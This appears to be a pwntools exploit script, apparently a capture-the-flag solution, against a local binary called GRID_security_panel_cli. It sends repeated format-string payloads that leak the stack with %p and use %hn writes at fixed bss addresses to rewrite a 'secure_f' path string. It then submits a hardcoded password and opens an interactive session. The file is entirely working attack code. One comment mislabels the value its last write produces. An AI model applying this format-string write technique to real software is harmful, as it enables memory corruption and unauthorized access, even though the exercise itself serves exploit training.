from pwn import *

p = process("./GRID_security_panel_cli")
# p = process(["gdbserver", "localhost:3333", "./GRID_security_panel_cli"])
p.recvuntil(b"> ")

# overwrite 'se' by '//'
pld  = b"A"*256 # fill input buffer
pld += b"%p"*80 # read stack until "%p%p%p..." buffer
pld += b"\xe8\x02\x0f\x08" # address to write in bss
pld += f"%{(11314)}x%121$hn".encode() # write '//' 0x2f2f
p.sendline(pld)
# overwrite 'cu' by '//'
pld  = b"A"*256 # fill input buffer
pld += b"%p"*80 # read stack until "%p%p%p..." buffer
pld += b"\xea\x02\x0f\x08" # address to write in bss
pld += f"%{(11314)}x%121$hn".encode() # write '//' 0x2f2f
p.sendline(pld)
# overwrite 're' by '//'
pld  = b"A"*256 # fill input buffer
pld += b"%p"*80 # read stack until "%p%p%p..." buffer
pld += b"\xec\x02\x0f\x08" # address to write in bss
pld += f"%{(11314)}x%121$hn".encode() # write '//' 0x2f2f
p.sendline(pld)
# overwrite '_f' by '/f'
pld  = b"A"*256 # fill input buffer
pld += b"%p"*80 # read stack until "%p%p%p..." buffer
pld += b"\xee\x02\x0f\x08" # address to write in bss
pld += f"%{(25394)}x%121$hn".encode() # write '//' 0x2f2f
p.sendline(pld)
p.sendline(b"access main security grid password:M4g1K_W0rD")
print(p.recv(1024))
p.interactive()

